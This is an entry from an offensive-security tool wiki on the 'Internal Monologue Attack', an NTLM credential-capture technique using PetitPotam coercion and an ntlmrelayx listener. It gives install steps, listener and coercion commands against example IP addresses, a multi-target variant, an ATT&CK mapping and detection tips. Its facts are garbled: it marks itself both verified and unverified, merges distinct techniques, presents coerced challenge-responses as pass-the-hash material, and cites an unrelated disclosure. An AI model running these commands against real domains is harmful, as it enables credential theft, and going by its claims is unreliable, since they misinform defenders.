---
id: 75f07cd5-943b-4a77-acab-a8e27914070b
type: tool
verified: true
created_at: '2019-08-28T21:17:26.852916+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - ntlm
  - coercion
  - credential-access
  - hash-dumping
url: 'https://github.com/topotam/PetitPotam'
validated: true
---

# Internal-Monologue-Attack

**Status**: Unverified

## Overview

The Internal Monologue Attack is a credential access technique that allows retrieval of NTLM hashes for domain machine accounts without directly accessing or dumping the LSASS process on the target system. It leverages authentication coercion to force the target machine to authenticate to an attacker-controlled server, where the NTLM hash can be captured via relay tools. Commonly used in Active Directory environments for pass-the-hash attacks or further lateral movement.

## Description

This attack exploits Windows authentication protocols by coercing outgoing NTLM authentications using protocols like MS-EFSRPC (via PetitPotam). The attacker sets up a relay server (e.g., ntlmrelayx) to intercept and log the hashes without performing a full relay attack. It's particularly useful in environments with SMB signing enabled or where direct LSASS dumping is detected/blocked. Discovered by @_xpn and others, it targets domain-joined Windows machines and requires network access to the target.

## Features

- Avoids LSASS memory dumping on the victim machine
- Works against modern Windows (Win7+ ) with SMB2/3 support
- Captures machine account hashes for PtH
- Integrates with coercion tools like PetitPotam, PrinterBug, or DFSCoerce
- No need for administrative privileges on the target for coercion

## Installation

### Requirements

- Python 3.6+
- Impacket suite (for ntlmrelayx)
- Git for cloning repositories
- Network access to target domain

### Install Commands

```bash
# Install Impacket
pip3 install impacket

# Clone PetitPotam for coercion
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam

# For additional coercion methods, clone others if needed
git clone https://github.com/byt3bl33d3r/PrinterBug.git
```

On Kali Linux, Impacket is often pre-installed or available via apt: `sudo apt install impacket-scripts`.

## Basic Usage

```bash
ntlmrelayx.py --no-http-server --no-acl -smb2support
```

Start the relay listener first, then coerce from another terminal.

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -debug | Enable debug output for troubleshooting |
| --smb2support | Support SMB2 protocol for newer Windows |

## Examples

### Example 1: Basic Usage

Set up capture:

```bash
ntlmrelayx.py --no-http-server --no-acl -smb2support -o hashes.txt
```

Then coerce:

```bash
python3 PetitPotam.py 192.168.1.100 192.168.1.200
```

### Example 2: Advanced Usage

Combine with target file for multiple machines:

```bash
touch targets.txt
echo "192.168.1.100" >> targets.txt
echo "192.168.1.101" >> targets.txt
ntlmrelayx.py -tf targets.txt --no-http-server --no-acl -smb2support
```

Coerce each target sequentially.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Adversary-in-the-Middle]] Adversary-in-the-Middle
- [[Pass the Hash]] Use Alternate Authentication Material: Pass the Hash
- [[Security Account Manager]] Security Account Manager (alternative to direct dumping)

### Tactics

- [[Credential Access]] Credential Access

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual outgoing MS-EFSRPC (RPC 1.8) or MS-PAR (Printer) requests from domain machines
- Network traffic to unexpected IPs on ports 445 (SMB) or 139 (NetBIOS)
- Event ID 4624/4776 in Windows logs for failed authentications from machine accounts
- Monitor for tools like PetitPotam.py in process lists or network captures
- Enable SMB signing and restrict RPC endpoints

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Impacket]]
- [[tools/Responder]]
- [[tools/CrackMapExec]]

## References

- Original disclosure: https://posts.specterops.io/delegating-access-in-active-directory-to-improve-threat-hunting-4f93a7c8324b
- PetitPotam GitHub: https://github.com/topotam/PetitPotam
- Impacket documentation: https://github.com/fortra/impacket

*Last updated: 2023-10-01*
